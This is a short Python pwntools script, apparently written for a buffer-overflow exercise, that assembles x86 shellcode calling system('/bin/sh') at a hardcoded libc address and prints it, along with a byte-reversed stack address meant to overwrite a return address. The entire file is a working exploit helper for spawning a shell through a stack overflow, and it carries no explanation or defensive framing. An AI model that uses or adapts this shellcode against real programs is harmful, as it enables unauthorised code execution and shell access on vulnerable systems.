#!/usr/bin/python
import pwn
import sys

def addBackslashX(input):
    return ''.join(['\\x' + input[i:i+2] for i in range(0, len(input), 2)])

def invertEndian(hexcode):
	return ''.join(hexcode[i:i+2] for i in range(len(hexcode)-2, -2, -2))

#system("/bin/sh")
bufferAddress = 'ffffd6cc'
systemAddress = '0xf7e6aed0'
hexCode = pwn.asm('''
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push ebx

	mov eax, ''' + systemAddress + '''
	call eax
    ''').hex()

addressCode = addBackslashX(invertEndian(bufferAddress))
sys.stdout.write('\nAddress:\n' + addressCode + '\n')
sys.stdout.write('Len: ' + str(int(len(addressCode) / 4)) + '\n')

shellCode = addBackslashX(hexCode)
sys.stdout.write('\nShellcode:\n' + shellCode + '\n')
sys.stdout.write('Len: ' + str(int(len(shellCode) / 4)) + '\n')
